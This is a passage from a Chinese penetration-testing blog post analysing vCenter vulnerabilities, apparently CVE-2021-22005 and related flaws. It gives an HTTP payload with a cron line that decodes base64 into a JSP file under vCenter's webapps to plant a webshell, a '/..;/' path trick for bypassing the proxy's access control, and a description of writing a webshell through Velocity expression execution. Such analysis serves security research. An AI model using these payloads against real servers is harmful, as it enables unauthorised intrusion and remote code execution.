+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">144</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">*</span> <span class="err">*</span> <span class="err">*</span> <span class="err">*</span> <span class="err">*</span> <span class="err">root</span> <span class="err">echo</span> <span class="err">PCUgICAgICAgIG</span><span class="mi">91</span><span class="err">dC</span><span class="mi">5</span><span class="err">wcmludGxuKCJIZWxsb</span><span class="mi">1</span><span class="err">dvcmxkIik</span><span class="mi">7</span><span class="err">ICAgICAgJT</span><span class="mi">4</span><span class="err">=|base</span><span class="mi">64</span> <span class="err">-d</span> <span class="err">&gt;/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/hello.jsp</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>待定时任务启动后，可在 <code>https://localhost/idm/..;/hello.jsp</code>   可以访问到 shell。</p>
+<p>(这里的<code>/..;/</code>是因为Tomcat会将<code>/..;/</code>视作<code>/../</code>，可以利用该特性绕过 vCenter 某些版本的 <code>rhttpproxy</code> 的访问限制)。</p>
+<h5 id="dataappagentcontroller-漏洞">DataAppAgentController 漏洞</h5>
+<p>官方提供的 POC 中还涉及到一个接口：<code>/analytics/telemetry/ph/api/dataapp/agent</code>，而在新版本的代码中，已经将端点： <code>/dataapp/agent</code> 相关代码全部删除，因此确定漏洞的位置。</p>
+<p>最终通过<code>VelocityHelper.executeVelocityExpression</code> 触发 <code>velocity</code> 表达式执行。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081747127.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081747127.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081747127.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081747127.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081747127.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205081747127.png-water_print" /></p>
+<p>最终 <code>@testbnull</code> 发现可以通过上下文可用的 <code>$GLOBAL-logger</code>，利用 <code>setFile</code> 方法临时修改日志路径到 Web 路径的方式，写入 WebShell 实现 RCE。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/234112" target="_blank" rel="noopener noreffer">VMware vCenter RCE 漏洞踩坑实录</a></li>
+<li><a href="https://hosch3n.github.io/2021/07/06/VMware-vCenter%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88%e4%b8%80%ef%bc%89/" target="_blank" rel="noopener noreffer">VMware vCenter 漏洞分析（一）</a></li>
+<li><a href="https://cangqingzhe.github.io/2021/06/07/Vcenter%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/" target="_blank" rel="noopener noreffer">Vcenter 漏洞分析</a></li>
+<li><a href="http://noahblog.360.cn/vcenter-cve-2021-2021-21985/" target="_blank" rel="noopener noreffer">CVE-2021-21985 vCenter Server 远程代码执行漏洞分析</a></li>
+<li><a href="https://daidaitiehanhan.github.io/2022/04/18/vCenter2021%e5%87%a0%e4%b8%aa%e6%bc%8f%e6%b4%9e%e5%8f%8a%e5%90%8e%e6%b8%97%e9%80%8f/" target="_blank" rel="noopener noreffer">vCenter 2021 几个漏洞及后渗透</a></li>
+<li><a href="https://www.bilibili.com/video/BV1Cp4y147Dd" target="_blank" rel="noopener noreffer">全网最详细的 ESXI 进阶教程</a></li>
+<li><a href="http://noahblog.360.cn/vcenter-6-5-7-0-rce-lou-dong-fen-xi/" target="_blank" rel="noopener noreffer">CVE-2021-21972 vCenter Server 文件写入漏洞分析</a></li>
+<li><a href="https://0x20h.com/p/7cb6" target="_blank" rel="noopener noreffer">CVE-2021-21972 复现和分析</a></li>
+<li><a href="https://xz.aliyun.com/t/10524" target="_blank" rel="noopener noreffer">CVE-2021-22005-CEIP分析</a></li>
+<li><a href="https://censys.io/vmware-cve-2021-22005-technical-impact-analysis/" target="_blank" rel="noopener noreffer">VMware CVE-2021-22005 Technical &amp; Impact analysis</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-05-08</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" data-title="vCenter 漏洞利用"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" data-title="vCenter 漏洞利用"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" data-title="vCenter 漏洞利用"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="prev" rel="prev" title="Spring beans RCE 漏洞分析"><i class="fas fa-angle-left fa-fw"></i>Spring beans RCE 漏洞分析</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
